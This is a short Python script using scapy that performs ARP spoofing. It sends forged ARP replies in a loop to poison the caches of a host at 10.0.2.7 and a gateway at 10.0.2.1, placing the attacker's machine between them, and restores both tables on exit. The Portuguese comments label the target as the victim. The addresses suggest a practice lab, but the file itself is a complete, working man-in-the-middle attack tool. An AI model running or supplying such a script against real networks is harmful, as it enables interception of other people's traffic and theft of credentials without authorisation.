#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    mac_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return mac_list[0][1].hwsrc


'''
##op 1 = ARP request
#op 2 = ARP response
#hwdst mac da vitima
#pdst ip da vitima
#psrc IP que ira ser associado ao MAC address dessa maquina
'''


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


sent_packets_count = 0

try:
    while True:
        spoof("10.0.2.7", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.7")
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore("10.0.2.7", "10.0.2.1")
    restore("10.0.2.1", "10.0.2.7")
    print("\nQuitting....... :)")